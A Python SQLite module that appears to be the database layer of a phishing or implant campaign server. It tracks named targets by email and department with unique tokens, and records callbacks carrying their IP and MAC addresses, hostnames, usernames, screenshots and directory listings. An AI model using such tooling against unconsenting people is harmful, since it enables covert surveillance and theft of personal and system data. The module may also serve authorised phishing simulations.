import sqlite3
import uuid
import os
from datetime import datetime, timezone, timedelta

CST = timezone(timedelta(hours=8))  # China Standard Time


def _to_local(dt_str):
    """Convert UTC timestamp string to UTC+8."""
    if not dt_str:
        return dt_str
    try:
        dt = datetime.strptime(dt_str, '%Y-%m-%d %H:%M:%S')
        dt = dt.replace(tzinfo=timezone.utc).astimezone(CST)
        return dt.strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return dt_str

DB_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'data')
DB_PATH = os.path.join(DB_DIR, 'database.db')


def get_db():
    os.makedirs(DB_DIR, exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON")
    return conn


def init_db():
    conn = get_db()
    conn.executescript('''
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            email TEXT DEFAULT '',
            department TEXT DEFAULT '',
            unique_token TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS collections (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER NOT NULL,
            ip_address TEXT DEFAULT '',
            mac_address TEXT DEFAULT '',
            hostname TEXT DEFAULT '',
            username TEXT DEFAULT '',
            screenshot_path TEXT DEFAULT '',
            directory_info TEXT DEFAULT '',
            exit_ip TEXT DEFAULT '',
            received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
    ''')
    conn.commit()
    # Add exit_ip column for existing databases
    try:
        conn.execute('ALTER TABLE collections ADD COLUMN exit_ip TEXT DEFAULT ""')
    except sqlite3.OperationalError:
        pass  # column already exists
    conn.close()


def add_target(name, email, department=''):
    conn = get_db()
    token = str(uuid.uuid4())
    conn.execute(
        'INSERT INTO targets (name, email, department, unique_token) VALUES (?, ?, ?, ?)',
        (name, email, department, token)
    )
    conn.commit()
    target_id = conn.execute('SELECT last_insert_rowid()').fetchone()[0]
    conn.close()
    return target_id, token


def add_targets_batch(entries):
    """entries: list of (name, email, department)"""
    conn = get_db()
    results = []
    for name, email, department in entries:
        token = str(uuid.uuid4())
        conn.execute(
            'INSERT INTO targets (name, email, department, unique_token) VALUES (?, ?, ?, ?)',
            (name, email, department, token)
        )
        target_id = conn.execute('SELECT last_insert_rowid()').fetchone()[0]
        results.append({'id': target_id, 'name': name, 'email': email, 'token': token})
    conn.commit()
    conn.close()
    return results


def get_all_targets():
    conn = get_db()
    rows = conn.execute('''
        SELECT t.*,
               (SELECT COUNT(*) FROM collections c WHERE c.target_id = t.id) as callback_count
        FROM targets t
        ORDER BY t.created_at DESC
    ''').fetchall()
    conn.close()
    result = []
    for r in rows:
        d = dict(r)
        d['created_at'] = _to_local(d.get('created_at'))
        result.append(d)
    return result


def get_target_by_id(target_id):
    conn = get_db()
    row = conn.execute('SELECT * FROM targets WHERE id = ?', (target_id,)).fetchone()
    conn.close()
    if not row:
        return None
    d = dict(row)
    d['created_at'] = _to_local(d.get('created_at'))
    return d


def get_target_by_token(token):
    conn = get_db()
    row = conn.execute('SELECT * FROM targets WHERE unique_token = ?', (token,)).fetchone()
    conn.close()
    return dict(row) if row else None


def add_collection(target_id, ip_address, mac_address, hostname, username,
                   screenshot_path, directory_info, exit_ip=''):
    conn = get_db()
    conn.execute(
        'INSERT INTO collections (target_id, ip_address, mac_address, hostname, '
        'username, screenshot_path, directory_info, exit_ip) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
        (target_id, ip_address, mac_address, hostname, username,
         screenshot_path, directory_info, exit_ip)
    )
    conn.commit()
    conn.close()


def delete_collection(collection_id):
    conn = get_db()
    conn.execute('DELETE FROM collections WHERE id = ?', (collection_id,))
    conn.commit()
    conn.close()


def delete_collections_batch(ids):
    conn = get_db()
    placeholders = ','.join('?' for _ in ids)
    conn.execute(f'DELETE FROM collections WHERE id IN ({placeholders})', ids)
    conn.commit()
    conn.close()


def get_collections_by_target(target_id):
    conn = get_db()
    rows = conn.execute(
        'SELECT * FROM collections WHERE target_id = ? ORDER BY received_at DESC',
        (target_id,)
    ).fetchall()
    conn.close()
    result = []
    for r in rows:
        d = dict(r)
        d['received_at'] = _to_local(d.get('received_at'))
        result.append(d)
    return result


def get_all_collections():
    conn = get_db()
    rows = conn.execute('''
        SELECT c.*, t.name as target_name, t.email as target_email, t.department as target_department
        FROM collections c
        JOIN targets t ON t.id = c.target_id
        ORDER BY c.received_at DESC
    ''').fetchall()
    conn.close()
    result = []
    for r in rows:
        d = dict(r)
        d['received_at'] = _to_local(d.get('received_at'))
        result.append(d)
    return result


def get_stats():
    conn = get_db()
    total_targets = conn.execute('SELECT COUNT(*) FROM targets').fetchone()[0]
    total_collected = conn.execute(
        'SELECT COUNT(DISTINCT target_id) FROM collections'
    ).fetchone()[0]
    total_exes = conn.execute('SELECT COUNT(*) FROM targets').fetchone()[0]
    conn.close()
    return {
        'total_targets': total_targets,
        'total_collected': total_collected,
        'total_exes': total_exes,
    }
